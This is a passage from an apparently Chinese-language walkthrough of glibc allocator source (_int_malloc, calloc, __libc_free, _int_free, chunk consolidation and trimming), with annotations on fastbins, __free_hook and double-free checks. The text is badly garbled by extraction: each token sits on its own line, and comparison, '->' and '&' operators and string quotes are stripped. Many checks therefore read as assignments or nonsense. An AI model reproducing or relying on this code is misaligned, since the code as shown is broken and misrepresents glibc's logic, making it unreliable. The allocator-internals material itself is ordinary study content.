\n=\n \nremainder\n;\n\n            \n// \u8fd9\u91cc\u8bbe\u7f6e PREV_INUSE \u662f\u56e0\u4e3a top chunk \u7684 chunk \u5982\u679c\u4e0d\u662f fastbin\uff0c\u5c31\u5fc5\u7136\u4f1a\u548c\n\n            \n// top chunk \u5408\u5e76\uff0c\u6240\u4ee5\u8fd9\u91cc\u8bbe\u7f6e\u4e86 PREV_INUSE\u3002\n\n            \nset_head\n(\nvictim\n,\n \nnb\n \n|\n \nPREV_INUSE\n \n|\n\n                                 \n(\nav\n \n!=\n \nmain_arena\n \n?\n \nNON_MAIN_ARENA\n \n:\n \n0\n));\n\n            \nset_head\n(\nremainder\n,\n \nremainder_size\n \n|\n \nPREV_INUSE\n);\n\n\n            \ncheck_malloced_chunk\n(\nav\n,\n \nvictim\n,\n \nnb\n);\n\n            \nvoid\n \n*\np\n \n=\n \nchunk2mem\n(\nvictim\n);\n\n            \nalloc_perturb\n(\np\n,\n \nbytes\n);\n\n            \nreturn\n \np\n;\n\n        \n}\n\n        \n// \u5426\u5219\uff0c\u5224\u65ad\u662f\u5426\u6709 fast chunk\n\n        \n/* When we are using atomic ops to free fast chunks we can get\n\n\n           here for all block sizes.  */\n\n        \nelse\n \nif\n \n(\nhave_fastchunks\n(\nav\n))\n \n{\n\n            \n// \u5148\u6267\u884c\u4e00\u6b21fast bin\u7684\u5408\u5e76\n\n            \nmalloc_consolidate\n(\nav\n);\n\n            \n/* restore original bin index */\n\n            \n// \u5224\u65ad\u9700\u8981\u7684chunk\u662f\u5728small bin\u8303\u56f4\u5185\u8fd8\u662flarge bin\u8303\u56f4\u5185\n\n            \n// \u5e76\u8ba1\u7b97\u5bf9\u5e94\u7684\u7d22\u5f15\n\n            \n// \u7b49\u5f85\u4e0b\u6b21\u518d\u770b\u770b\u662f\u5426\u53ef\u4ee5\n\n            \nif\n \n(\nin_smallbin_range\n(\nnb\n))\n\n                \nidx\n \n=\n \nsmallbin_index\n(\nnb\n);\n\n            \nelse\n\n                \nidx\n \n=\n \nlargebin_index\n(\nnb\n);\n\n        \n}\n\n\n        \n/*\n\n\n           Otherwise, relay to handle system-dependent cases\n\n\n         */\n\n        \n// \u5426\u5219\u7684\u8bdd\uff0c\u6211\u4eec\u5c31\u53ea\u80fd\u4ece\u7cfb\u7edf\u4e2d\u518d\u6b21\u7533\u8bf7\u4e00\u70b9\u5185\u5b58\u4e86\u3002\n\n        \nelse\n \n{\n\n            \nvoid\n \n*\np\n \n=\n \nsysmalloc\n(\nnb\n,\n \nav\n);\n\n            \nif\n \n(\np\n \n!=\n \nNULL\n)\n \nalloc_perturb\n(\np\n,\n \nbytes\n);\n\n            \nreturn\n \np\n;\n\n        \n}\n\n\n\n\n\n_libc_calloc\n\n\ncalloc \u4e5f\u662f libc \u4e2d\u7684\u4e00\u79cd\u7533\u8bf7\u5185\u5b58\u5757\u7684\u51fd\u6570\u3002\u5728 \nlibc\n\u4e2d\u7684\u5305\u88c5\u4e3a \n_libc_calloc\n\uff0c\u5177\u4f53\u4ecb\u7ecd\u5982\u4e0b\n\n\n/*\n\n\n  calloc(size_t n_elements, size_t element_size);\n\n\n  Returns a pointer to n_elements * element_size bytes, with all locations\n\n\n  set to zero.\n\n\n*/\n\n\nvoid\n*\n  \n__libc_calloc\n(\nsize_t\n,\n \nsize_t\n);\n\n\n\n\n\nsysmalloc\n\n\n\u6709\u65f6\u95f4\u7684\u65f6\u5019\u518d\u5206\u6790\u3002\n\n\n\u91ca\u653e\u5185\u5b58\u5757\n\n\n__libc_free\n\n\n\u7c7b\u4f3c\u4e8e malloc\uff0cfree \u51fd\u6570\u4e5f\u6709\u4e00\u5c42\u5c01\u88c5\uff0c\u547d\u540d\u683c\u5f0f\u4e0e malloc \u57fa\u672c\u7c7b\u4f3c\u3002\u4ee3\u7801\u5982\u4e0b\n\n\nvoid\n \n__libc_free\n(\nvoid\n \n*\nmem\n)\n \n{\n\n    \nmstate\n    \nar_ptr\n;\n\n    \nmchunkptr\n \np\n;\n \n/* chunk corresponding to mem */\n\n    \n// \u5224\u65ad\u662f\u5426\u6709\u94a9\u5b50\u51fd\u6570 __free_hook\n\n    \nvoid\n \n(\n*\nhook\n)(\nvoid\n \n*\n,\n \nconst\n \nvoid\n \n*\n)\n \n=\n \natomic_forced_read\n(\n__free_hook\n);\n\n    \nif\n \n(\n__builtin_expect\n(\nhook\n \n!=\n \nNULL\n,\n \n0\n))\n \n{\n\n        \n(\n*\nhook\n)(\nmem\n,\n \nRETURN_ADDRESS\n(\n0\n));\n\n        \nreturn\n;\n\n    \n}\n\n    \n// free NULL\u6ca1\u6709\u4f5c\u7528\n\n    \nif\n \n(\nmem\n \n==\n \n0\n)\n \n/* free(0) has no effect */\n\n        \nreturn\n;\n\n    \n// \u5c06mem\u8f6c\u6362\u4e3achunk\u72b6\u6001\n\n    \np\n \n=\n \nmem2chunk\n(\nmem\n);\n\n    \n// \u5982\u679c\u8be5\u5757\u5185\u5b58\u662fmmap\u5f97\u5230\u7684\n\n    \nif\n \n(\nchunk_is_mmapped\n(\np\n))\n \n/* release mmapped memory. */\n\n    \n{\n\n        \n/* See if the dynamic brk/mmap threshold needs adjusting.\n\n\n       Dumped fake mmapped chunks do not affect the threshold.  */\n\n        \nif\n \n(\n!\nmp_\n.\nno_dyn_threshold\n \n \nchunksize_nomask\n(\np\n)\n \n \nmp_\n.\nmmap_threshold\n \n\n            \nchunksize_nomask\n(\np\n)\n \n=\n \nDEFAULT_MMAP_THRESHOLD_MAX\n \n\n            \n!\nDUMPED_MAIN_ARENA_CHUNK\n(\np\n))\n \n{\n\n            \nmp_\n.\nmmap_threshold\n \n=\n \nchunksize\n(\np\n);\n\n            \nmp_\n.\ntrim_threshold\n \n=\n \n2\n \n*\n \nmp_\n.\nmmap_threshold\n;\n\n            \nLIBC_PROBE\n(\nmemory_mallopt_free_dyn_thresholds\n,\n \n2\n,\n\n                       \nmp_\n.\nmmap_threshold\n,\n \nmp_\n.\ntrim_threshold\n);\n\n        \n}\n\n        \nmunmap_chunk\n(\np\n);\n\n        \nreturn\n;\n\n    \n}\n\n    \n// \u6839\u636echunk\u83b7\u5f97\u5206\u914d\u533a\u7684\u6307\u9488\n\n    \nar_ptr\n \n=\n \narena_for_chunk\n(\np\n);\n\n    \n// \u6267\u884c\u91ca\u653e\n\n    \n_int_free\n(\nar_ptr\n,\n \np\n,\n \n0\n);\n\n\n}\n\n\n\n\n\n_int_free\n\n\n\u51fd\u6570\u521d\u59cb\u65f6\u523b\u5b9a\u4e49\u4e86\u4e00\u7cfb\u5217\u7684\u53d8\u91cf\uff0c\u5e76\u4e14\u5f97\u5230\u4e86\u7528\u6237\u60f3\u8981\u91ca\u653e\u7684 chunk \u7684\u5927\u5c0f\n\n\nstatic\n \nvoid\n \n_int_free\n(\nmstate\n \nav\n,\n \nmchunkptr\n \np\n,\n \nint\n \nhave_lock\n)\n \n{\n\n    \nINTERNAL_SIZE_T\n \nsize\n;\n      \n/* its size */\n\n    \nmfastbinptr\n \n*\n   \nfb\n;\n        \n/* associated fastbin */\n\n    \nmchunkptr\n       \nnextchunk\n;\n \n/* next contiguous chunk */\n\n    \nINTERNAL_SIZE_T\n \nnextsize\n;\n  \n/* its size */\n\n    \nint\n             \nnextinuse\n;\n \n/* true if nextchunk is used */\n\n    \nINTERNAL_SIZE_T\n \nprevsize\n;\n  \n/* size of previous contiguous chunk */\n\n    \nmchunkptr\n       \nbck\n;\n       \n/* misc temp for linking */\n\n    \nmchunkptr\n       \nfwd\n;\n       \n/* misc temp for linking */\n\n\n    \nconst\n \nchar\n \n*\nerrstr\n \n=\n \nNULL\n;\n\n    \nint\n         \nlocked\n \n=\n \n0\n;\n\n\n    \nsize\n \n=\n \nchunksize\n(\np\n);\n\n\n\n\n\n\u7b80\u5355\u7684\u68c0\u67e5\n\n\n    \n/* Little security check which won\nt hurt performance: the\n\n\n       allocator never wrapps around at the end of the address space.\n\n\n       Therefore we can exclude some size values which might appear\n\n\n       here by accident or by \ndesign\n from some intruder.  */\n\n    \n// \u6307\u9488\u4e0d\u80fd\u6307\u5411\u975e\u6cd5\u7684\u5730\u5740, \u5fc5\u987b\u5c0f\u4e8e\u7b49\u4e8e-size\uff0c\u4e3a\u4ec0\u4e48\uff1f\uff1f\uff1f\n\n    \n// \u6307\u9488\u5fc5\u987b\u5f97\u5bf9\u9f50\uff0c2*SIZE_SZ \u8fd9\u4e2a\u5bf9\u9f50\u5f97\u4ed4\u7ec6\u60f3\u60f3\n\n    \nif\n \n(\n__builtin_expect\n((\nuintptr_t\n)\n \np\n \n \n(\nuintptr_t\n)\n \n-\nsize\n,\n \n0\n)\n \n||\n\n        \n__builtin_expect\n(\nmisaligned_chunk\n(\np\n),\n \n0\n))\n \n{\n\n        \nerrstr\n \n=\n \nfree(): invalid pointer\n;\n\n    \nerrout\n:\n\n        \nif\n \n(\n!\nhave_lock\n \n \nlocked\n)\n \n__libc_lock_unlock\n(\nav\n-\nmutex\n);\n\n        \nmalloc_printerr\n(\ncheck_action\n,\n \nerrstr\n,\n \nchunk2mem\n(\np\n),\n \nav\n);\n\n        \nreturn\n;\n\n    \n}\n\n    \n/* We know that each chunk is at least MINSIZE bytes in size or a\n\n\n       multiple of MALLOC_ALIGNMENT.  */\n\n    \n// \u5927\u5c0f\u6ca1\u6709\u6700\u5c0f\u7684chunk\u5927\uff0c\u6216\u8005\u8bf4\uff0c\u5927\u5c0f\u4e0d\u662fMALLOC_ALIGNMENT\u7684\u6574\u6570\u500d\n\n    \nif\n \n(\n__glibc_unlikely\n(\nsize\n \n \nMINSIZE\n \n||\n \n!\naligned_OK\n(\nsize\n)))\n \n{\n\n        \nerrstr\n \n=\n \nfree(): invalid size\n;\n\n        \ngoto\n \nerrout\n;\n\n    \n}\n\n    \n// \u68c0\u67e5\u8be5chunk\u662f\u5426\u5904\u4e8e\u4f7f\u7528\u72b6\u6001\uff0c\u975e\u8c03\u8bd5\u72b6\u6001\u4e0b\u6ca1\u6709\u4f5c\u7528\n\n    \ncheck_inuse_chunk\n(\nav\n,\n \np\n);\n\n\n\n\n\n\u5176\u4e2d\n\n\n/* Check if m has acceptable alignment */\n\n\n\n#define aligned_OK(m) (((unsigned long) (m) \nMALLOC_ALIGN_MASK) == 0)\n\n\n\n#define misaligned_chunk(p)                                                    \\\n\n\n    ((uintptr_t)(MALLOC_ALIGNMENT == 2 * SIZE_SZ ? (p) : chunk2mem(p)) \n       \\\n\n\n     MALLOC_ALIGN_MASK)\n\n\n\n\n\nfast bin\n\n\n\u5982\u679c\u4e0a\u8ff0\u68c0\u67e5\u90fd\u5408\u683c\u7684\u8bdd\uff0c\u5224\u65ad\u5f53\u524d\u7684 bin \u662f\u4e0d\u662f\u5728 fast bin \u8303\u56f4\u5185\uff0c\u5728\u7684\u8bdd\u5c31\u63d2\u5165\u5230 \nfastbin \u5934\u90e8\n\uff0c\u5373\u6210\u4e3a\u5bf9\u5e94 fastbin \u94fe\u8868\u7684\n\u7b2c\u4e00\u4e2a free chunk\n\u3002\n\n\n    \n/*\n\n\n      If eligible, place chunk on a fastbin so it can be found\n\n\n      and used quickly in malloc.\n\n\n    */\n\n\n    \nif\n \n((\nunsigned\n \nlong\n)\n \n(\nsize\n)\n \n=\n \n(\nunsigned\n \nlong\n)\n \n(\nget_max_fast\n())\n\n\n\n#if TRIM_FASTBINS\n\n        \n/*\n\n\n      If TRIM_FASTBINS set, don\nt place chunks\n\n\n      bordering top into fastbins\n\n\n        */\n\n       \n//\u9ed8\u8ba4 #define TRIM_FASTBINS 0\uff0c\u56e0\u6b64\u9ed8\u8ba4\u60c5\u51b5\u4e0b\u4e0b\u9762\u7684\u8bed\u53e5\u4e0d\u4f1a\u6267\u884c\n\n       \n// \u5982\u679c\u5f53\u524dchunk\u662ffast chunk\uff0c\u5e76\u4e14\u4e0b\u4e00\u4e2achunk\u662ftop chunk\uff0c\u5219\u4e0d\u80fd\u63d2\u5165\n\n        \n \n(\nchunk_at_offset\n(\np\n,\n \nsize\n)\n \n!=\n \nav\n-\ntop\n)\n\n\n#endif\n\n            \n)\n \n{\n\n        \n// \u4e0b\u4e00\u4e2achunk\u7684\u5927\u5c0f\u4e0d\u80fd\u5c0f\u4e8e\u4e24\u500d\u7684SIZE_SZ,\u5e76\u4e14\n\n        \n// \u4e0b\u4e00\u4e2achunk\u7684\u5927\u5c0f\u4e0d\u80fd\u5927\u4e8esystem_mem\uff0c \u4e00\u822c\u4e3a132k\n\n        \n// \u5982\u679c\u51fa\u73b0\u8fd9\u6837\u7684\u60c5\u51b5\uff0c\u5c31\u62a5\u9519\u3002\n\n        \nif\n \n(\n__builtin_expect\n(\n\n                \nchunksize_nomask\n(\nchunk_at_offset\n(\np\n,\n \nsize\n))\n \n=\n \n2\n \n*\n \nSIZE_SZ\n,\n \n0\n)\n \n||\n\n            \n__builtin_expect\n(\n\n                \nchunksize\n(\nchunk_at_offset\n(\np\n,\n \nsize\n))\n \n=\n \nav\n-\nsystem_mem\n,\n \n0\n))\n \n{\n\n            \n/* We might not have a lock at this point and concurrent\n\n\n               modifications\n\n\n               of system_mem might have let to a false positive.  Redo the test\n\n\n               after getting the lock.  */\n\n            \nif\n \n(\nhave_lock\n \n||\n \n({\n\n                    \nassert\n(\nlocked\n \n==\n \n0\n);\n\n                    \n__libc_lock_lock\n(\nav\n-\nmutex\n);\n\n                    \nlocked\n \n=\n \n1\n;\n\n                    \nchunksize_nomask\n(\nchunk_at_offset\n(\np\n,\n \nsize\n))\n \n=\n \n2\n \n*\n \nSIZE_SZ\n \n||\n\n                        \nchunksize\n(\nchunk_at_offset\n(\np\n,\n \nsize\n))\n \n=\n \nav\n-\nsystem_mem\n;\n\n                \n}))\n \n{\n\n                \nerrstr\n \n=\n \nfree(): invalid next size (fast)\n;\n\n                \ngoto\n \nerrout\n;\n\n            \n}\n\n            \nif\n \n(\n!\nhave_lock\n)\n \n{\n\n                \n__libc_lock_unlock\n(\nav\n-\nmutex\n);\n\n                \nlocked\n \n=\n \n0\n;\n\n            \n}\n\n        \n}\n\n        \n// \u5c06chunk\u7684mem\u90e8\u5206\u5168\u90e8\u8bbe\u7f6e\u4e3aperturb_byte \n\n        \nfree_perturb\n(\nchunk2mem\n(\np\n),\n \nsize\n \n-\n \n2\n \n*\n \nSIZE_SZ\n);\n\n        \n// \u8bbe\u7f6efast chunk\u7684\u6807\u8bb0\u4f4d\n\n        \nset_fastchunks\n(\nav\n);\n\n        \n// \u6839\u636e\u5927\u5c0f\u83b7\u53d6fast bin\u7684\u7d22\u5f15\n\n        \nunsigned\n \nint\n \nidx\n \n=\n \nfastbin_index\n(\nsize\n);\n\n        \n// \u83b7\u53d6\u5bf9\u5e94fastbin\u7684\u5934\u6307\u9488\uff0c\u88ab\u521d\u59cb\u5316\u540e\u4e3aNULL\u3002\n\n        \nfb\n               \n=\n \nfastbin\n(\nav\n,\n \nidx\n);\n\n\n        \n/* Atomically link P to its fastbin: P-\nFD = *FB; *FB = P;  */\n\n        \n// \u4f7f\u7528\u539f\u5b50\u64cd\u4f5c\u5c06P\u63d2\u5165\u5230\u94fe\u8868\u4e2d\n\n        \nmchunkptr\n    \nold\n     \n=\n \n*\nfb\n,\n \nold2\n;\n\n        \nunsigned\n \nint\n \nold_idx\n \n=\n \n~\n0u\n;\n\n        \ndo\n \n{\n\n            \n/* Check that the top of the bin is not the record we are going to\n\n\n               add\n\n\n               (i.e., double free).  */\n\n            \n// so we can not double free one fastbin chunk\n\n            \n// \u9632\u6b62\u5bf9 fast bin double free\n\n            \nif\n \n(\n__builtin_expect\n(\nold\n \n==\n \np\n,\n \n0\n))\n \n{\n\n                \nerrstr\n \n=\n \ndouble free or corruption (fasttop)\n;\n\n                \ngoto\n \nerrout\n;\n\n            \n}\n\n            \n/* Check that size of fastbin chunk at the top is the same as\n\n\n               size of the chunk that we are adding.  We can dereference OLD\n\n\n               only if we have the lock, otherwise it might have already been\n\n\n               deallocated.  See use of OLD_IDX below for the actual check.  */\n\n            \nif\n \n(\nhave_lock\n \n \nold\n \n!=\n \nNULL\n)\n\n                \nold_idx\n \n=\n \nfastbin_index\n(\nchunksize\n(\nold\n));\n\n            \np\n-\nfd\n \n=\n \nold2\n \n=\n \nold\n;\n\n        \n}\n \nwhile\n \n((\nold\n \n=\n \ncatomic_compare_and_exchange_val_rel\n(\nfb\n,\n \np\n,\n \nold2\n))\n \n!=\n\n                 \nold2\n);\n\n        \n// \u786e\u4fddfast bin\u7684\u52a0\u5165\u524d\u4e0e\u52a0\u5165\u540e\u76f8\u540c\n\n        \nif\n \n(\nhave_lock\n \n \nold\n \n!=\n \nNULL\n \n \n__builtin_expect\n(\nold_idx\n \n!=\n \nidx\n,\n \n0\n))\n \n{\n\n            \nerrstr\n \n=\n \ninvalid fastbin entry (free)\n;\n\n            \ngoto\n \nerrout\n;\n\n        \n}\n\n    \n}\n\n\n\n\n\n\u5408\u5e76\u975e mmap \u7684\u7a7a\u95f2 chunk\n\n\n\u53ea\u6709\u4e0d\u662f fast bin \u7684\u60c5\u51b5\u4e0b\u624d\u4f1a\u89e6\u53d1unlink\n\n\n\u9996\u5148\u6211\u4eec\u5148\u8bf4\u4e00\u4e0b\u4e3a\u4ec0\u4e48\u4f1a\u5408\u5e76chunk\uff0c\u8fd9\u662f\u4e3a\u4e86\u907f\u514dheap\u4e2d\u6709\u592a\u591a\u96f6\u96f6\u788e\u788e\u7684\u5185\u5b58\u5757\uff0c\u5408\u5e76\u4e4b\u540e\u53ef\u4ee5\u7528\u6765\u5e94\u5bf9\u66f4\u5927\u7684\u5185\u5b58\u5757\u8bf7\u6c42\u3002\u5408\u5e76\u7684\u4e3b\u8981\u987a\u5e8f\u4e3a\n\n\n\n\n\u5148\u8003\u8651\u7269\u7406\u4f4e\u5730\u5740\u7a7a\u95f2\u5757\n\n\n\u540e\u8003\u8651\u7269\u7406\u9ad8\u5730\u5740\u7a7a\u95f2\u5757\n\n\n\n\n\u5408\u5e76\u540e\u7684 chunk \u6307\u5411\u5408\u5e76\u7684 chunk \u7684\u4f4e\u5730\u5740\u3002\n\n\n\u5728\u6ca1\u6709\u9501\u7684\u60c5\u51b5\u4e0b\uff0c\u5148\u83b7\u5f97\u9501\u3002\n\n\n    \n/*\n\n\n      Consolidate other non-mmapped chunks as they arrive.\n\n\n    */\n\n\n    \nelse\n \nif\n \n(\n!\nchunk_is_mmapped\n(\np\n))\n \n{\n\n        \nif\n \n(\n!\nhave_lock\n)\n \n{\n\n            \n__libc_lock_lock\n(\nav\n-\nmutex\n);\n\n            \nlocked\n \n=\n \n1\n;\n\n        \n}\n\n        \nnextchunk\n \n=\n \nchunk_at_offset\n(\np\n,\n \nsize\n);\n\n\n\n\n\n\u8f7b\u91cf\u7ea7\u7684\u68c0\u6d4b\n\n\n        \n/* Lightweight tests: check whether the block is already the\n\n\n           top block.  */\n\n        \n// \u5f53\u524dfree\u7684chunk\u4e0d\u80fd\u662ftop chunk\n\n        \nif\n \n(\n__glibc_unlikely\n(\np\n \n==\n \nav\n-\ntop\n))\n \n{\n\n            \nerrstr\n \n=\n \ndouble free or corruption (top)\n;\n\n            \ngoto\n \nerrout\n;\n\n        \n}\n\n        \n// \u5f53\u524dfree\u7684chunk\u7684\u4e0b\u4e00\u4e2achunk\u4e0d\u80fd\u8d85\u8fc7arena\u7684\u8fb9\u754c\n\n        \n/* Or whether the next chunk is beyond the boundaries of the arena.  */\n\n        \nif\n \n(\n__builtin_expect\n(\ncontiguous\n(\nav\n)\n \n\n                                 \n(\nchar\n \n*\n)\n \nnextchunk\n \n=\n\n                                     \n((\nchar\n \n*\n)\n \nav\n-\ntop\n \n+\n \nchunksize\n(\nav\n-\ntop\n)),\n\n                             \n0\n))\n \n{\n\n            \nerrstr\n \n=\n \ndouble free or corruption (out)\n;\n\n            \ngoto\n \nerrout\n;\n\n        \n}\n\n        \n// \u5f53\u524d\u8981free\u7684chunk\u7684\u4f7f\u7528\u6807\u8bb0\u6ca1\u6709\u88ab\u6807\u8bb0\uff0cdouble free\n\n        \n/* Or whether the block is actually not marked used.  */\n\n        \nif\n \n(\n__glibc_unlikely\n(\n!\nprev_inuse\n(\nnextchunk\n)))\n \n{\n\n            \nerrstr\n \n=\n \ndouble free or corruption (!prev)\n;\n\n            \ngoto\n \nerrout\n;\n\n        \n}\n\n        \n// \u4e0b\u4e00\u4e2achunk\u7684\u5927\u5c0f\n\n        \nnextsize\n \n=\n \nchunksize\n(\nnextchunk\n);\n\n        \n// next chunk size valid check\n\n        \n// \u5224\u65ad\u4e0b\u4e00\u4e2achunk\u7684\u5927\u5c0f\u662f\u5426\u4e0d\u5927\u4e8e2*SIZE_SZ\uff0c\u6216\u8005\n\n        \n// nextsize\u662f\u5426\u5927\u4e8e\u7cfb\u7edf\u53ef\u63d0\u4f9b\u7684\u5185\u5b58\n\n        \nif\n \n(\n__builtin_expect\n(\nchunksize_nomask\n(\nnextchunk\n)\n \n=\n \n2\n \n*\n \nSIZE_SZ\n,\n \n0\n)\n \n||\n\n            \n__builtin_expect\n(\nnextsize\n \n=\n \nav\n-\nsystem_mem\n,\n \n0\n))\n \n{\n\n            \nerrstr\n \n=\n \nfree(): invalid next size (normal)\n;\n\n            \ngoto\n \nerrout\n;\n\n        \n}\n\n\n\n\n\n\u91ca\u653e\u586b\u5145\n\n\n        \n//\u5c06\u6307\u9488\u7684mem\u90e8\u5206\u5168\u90e8\u8bbe\u7f6e\u4e3aperturb_byte \n\n        \nfree_perturb\n(\nchunk2mem\n(\np\n),\n \nsize\n \n-\n \n2\n \n*\n \nSIZE_SZ\n);\n\n\n\n\n\n\u540e\u5411\u5408\u5e76-\u5408\u5e76\u4f4e\u5730\u5740 chunk\n\n\n        \n/* consolidate backward */\n\n        \nif\n \n(\n!\nprev_inuse\n(\np\n))\n \n{\n\n            \nprevsize\n \n=\n \nprev_size\n(\np\n);\n\n            \nsize\n \n+=\n \nprevsize\n;\n\n            \np\n \n=\n \nchunk_at_offset\n(\np\n,\n \n-\n((\nlong\n)\n \nprevsize\n));\n\n            \nunlink\n(\nav\n,\n \np\n,\n \nbck\n,\n \nfwd\n);\n\n        \n}\n\n\n\n\n\n\u4e0b\u4e00\u5757\u4e0d\u662ftop chunk-\u524d\u5411\u5408\u5e76-\u5408\u5e76\u9ad8\u5730\u5740chunk\n\n\n\u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u5982\u679c\u4e0b\u4e00\u5757\u4e0d\u662f top chunk \u540e\uff0c\u5219\u5408\u5e76\u9ad8\u5730\u5740\u7684 chunk \uff0c\u5e76\u5c06\u5408\u5e76\u540e\u7684 chunk \u653e\u5165\u5230unsorted bin\u4e2d\u3002\n\n\n        \n// \u5982\u679c\u4e0b\u4e00\u4e2achunk\u4e0d\u662ftop chunk\n\n        \nif\n \n(\nnextchunk\n \n!=\n \nav\n-\ntop\n)\n \n{\n\n            \n/* get and clear inuse bit */\n\n            \n// \u83b7\u53d6\u4e0b\u4e00\u4e2a chunk \u7684\u4f7f\u7528\u72b6\u6001\n\n            \nnextinuse\n \n=\n \ninuse_bit_at_offset\n(\nnextchunk\n,\n \nnextsize\n);\n\n            \n// \u5982\u679c\u4e0d\u5728\u4f7f\u7528\uff0c\u5408\u5e76\uff0c\u5426\u5219\u6e05\u7a7a\u5f53\u524dchunk\u7684\u4f7f\u7528\u72b6\u6001\u3002\n\n            \n/* consolidate forward */\n\n            \nif\n \n(\n!\nnextinuse\n)\n \n{\n\n                \nunlink\n(\nav\n,\n \nnextchunk\n,\n \nbck\n,\n \nfwd\n);\n\n                \nsize\n \n+=\n \nnextsize\n;\n\n            \n}\n \nelse\n\n                \nclear_inuse_bit_at_offset\n(\nnextchunk\n,\n \n0\n);\n\n\n            \n/*\n\n\n          Place the chunk in unsorted chunk list. Chunks are\n\n\n          not placed into regular bins until after they have\n\n\n          been given one chance to be used in malloc.\n\n\n            */\n\n            \n// \u628a chunk \u653e\u5728 unsorted chunk \u94fe\u8868\u7684\u5934\u90e8\n\n            \nbck\n \n=\n \nunsorted_chunks\n(\nav\n);\n\n            \nfwd\n \n=\n \nbck\n-\nfd\n;\n\n            \n// \u7b80\u5355\u7684\u68c0\u67e5\n\n            \nif\n \n(\n__glibc_unlikely\n(\nfwd\n-\nbk\n \n!=\n \nbck\n))\n \n{\n\n                \nerrstr\n \n=\n \nfree(): corrupted unsorted chunks\n;\n\n                \ngoto\n \nerrout\n;\n\n            \n}\n\n            \np\n-\nfd\n \n=\n \nfwd\n;\n\n            \np\n-\nbk\n \n=\n \nbck\n;\n\n            \n// \u5982\u679c\u662f large chunk\uff0c\u90a3\u5c31\u8bbe\u7f6enextsize\u6307\u9488\u5b57\u6bb5\u4e3aNULL\u3002\n\n            \nif\n \n(\n!\nin_smallbin_range\n(\nsize\n))\n \n{\n\n                \np\n-\nfd_nextsize\n \n=\n \nNULL\n;\n\n                \np\n-\nbk_nextsize\n \n=\n \nNULL\n;\n\n            \n}\n\n            \nbck\n-\nfd\n \n=\n \np\n;\n\n            \nfwd\n-\nbk\n \n=\n \np\n;\n\n\n            \nset_head\n(\np\n,\n \nsize\n \n|\n \nPREV_INUSE\n);\n\n            \nset_foot\n(\np\n,\n \nsize\n);\n\n\n            \ncheck_free_chunk\n(\nav\n,\n \np\n);\n\n        \n}\n\n\n\n\n\n\u4e0b\u4e00\u5757\u662ftop chunk-\u5408\u5e76\u5230top chunk\n\n\n        \n/*\n\n\n          If the chunk borders the current high end of memory,\n\n\n          consolidate into top\n\n\n        */\n\n        \n// \u5982\u679c\u8981\u91ca\u653e\u7684chunk\u7684\u4e0b\u4e00\u4e2achunk\u662ftop chunk\uff0c\u90a3\u5c31\u5408\u5e76\u5230 top chunk\n\n        \nelse\n \n{\n\n            \nsize\n \n+=\n \nnextsize\n;\n\n            \nset_head\n(\np\n,\n \nsize\n \n|\n \nPREV_INUSE\n);\n\n            \nav\n-\ntop\n \n=\n \np\n;\n\n            \ncheck_chunk\n(\nav\n,\n \np\n);\n\n        \n}\n\n\n\n\n\n\u5411\u7cfb\u7edf\u8fd4\u8fd8\u5185\u5b58\n\n\n        \n/*\n\n\n          If freeing a large space, consolidate possibly-surrounding\n\n\n          chunks. Then, if the total unused topmost memory exceeds trim\n\n\n          threshold, ask malloc_trim to reduce top.\n\n\n\n          Unless max_fast is 0, we don\nt know if there are fastbins\n\n\n          bordering top, so we cannot tell for sure whether threshold\n\n\n          has been reached unless fastbins are consolidated.  But we\n\n\n          don\nt want to consolidate on each free.  As a compromise,\n\n\n          consolidation is performed if FASTBIN_CONSOLIDATION_THRESHOLD\n\n\n          is reached.\n\n\n        */\n\n         \n// \u5982\u679c\u5408\u5e76\u540e\u7684 chunk \u7684\u5927\u5c0f\u5927\u4e8eFASTBIN_CONSOLIDATION_THRESHOLD\n\n         \n// \u4e00\u822c\u5408\u5e76\u5230 top chunk \u90fd\u4f1a\u6267\u884c\u8fd9\u90e8\u5206\u4ee3\u7801\u3002\n\n         \n// \u90a3\u5c31\u5411\u7cfb\u7edf\u8fd4\u8fd8\u5185\u5b58\n\n        \nif\n \n((\nunsigned\n \nlong\n)\n \n(\nsize\n)\n \n=\n \nFASTBIN_CONSOLIDATION_THRESHOLD\n)\n \n{\n\n            \n// \u5982\u679c\u6709 fast chunk \u5c31\u8fdb\u884c\u5408\u5e76\n\n            \nif\n \n(\nhave_fastchunks\n(\nav\n))\n \nmalloc_consolidate\n(\nav\n);\n\n            \n// \u4e3b\u5206\u914d\u533a\n\n            \nif\n \n(\nav\n \n==\n \nmain_arena\n)\n \n{\n\n\n#ifndef MORECORE_CANNOT_TRIM\n\n                \n// top chunk \u5927\u4e8e\u5f53\u524d\u7684\u6536\u7f29\u9619\u503c\n\n                \nif\n \n((\nunsigned\n \nlong\n)\n \n(\nchunksize\n(\nav\n-\ntop\n))\n \n=\n\n                    \n(\nunsigned\n \nlong\n)\n \n(\nmp_\n.\ntrim_threshold\n))\n\n                    \nsystrim\n(\nmp_\n.\ntop_pad\n,\n \nav\n);\n\n\n#endif      \n// \u975e\u4e3b\u5206\u914d\u533a\uff0c\u5219\u76f4\u63a5\u6536\u7f29heap\n\n            \n}\n \nelse\n \n{\n\n                \n/* Always try heap_trim(), even if the top chunk is not\n\n\n                   large, because the corresponding heap might go away.  */\n\n                \nheap_info\n \n*\nheap\n \n=\n \nheap_for_ptr\n(\ntop\n(\nav\n));\n\n\n                \nassert\n(\nheap\n-\nar_ptr\n \n==\n \nav\n);\n\n                \nheap_trim\n(\nheap\n,\n \nmp_\n.\ntop_pad\n);\n\n            \n}\n\n        \n}\n\n\n        \nif\n \n(\n!\nhave_lock\n)\n \n{\n\n            \nassert\n(\nlocked\n);\n\n            \n__libc_lock_unlock\n(\nav\n-\nmutex\n);\n\n        \n}\n\n\n\n\n\n\u91ca\u653emmap\u7684chunk\n\n\n    \n}\n \nelse\n \n{\n\n        \n//  If the chunk was allocated via mmap, release via munmap().\n\n        \nmunmap_chunk\n(\np\n);\n\n    \n}\n\n\n\n\n\nsystrim\n\n\nheap_trim\n\n\nmunmap_chunk\n\n\n\u5220\u9664\u5806\n\n\nmalloc_state \u76f8\u5173\u51fd\u6570\n\n\nmalloc_init_state\n\n\n/*\n\n\n   Initialize a malloc_state struct.\n\n\n   This is called only from within malloc_consolidate, which needs\n\n\n   be called in the same contexts anyway.  It is never called directly\n\n\n   outside of malloc_consolidate because some optimizing compilers try\n\n\n   to inline it at all call points, which turns out not to be an\n\n\n   optimization at all. (Inlining it in malloc_consolidate is fine though.)\n\n\n */\n\n\n\nstatic\n \nvoid\n \nmalloc_init_state\n(\nmstate\n \nav\n)\n \n{\n\n    \nint\n     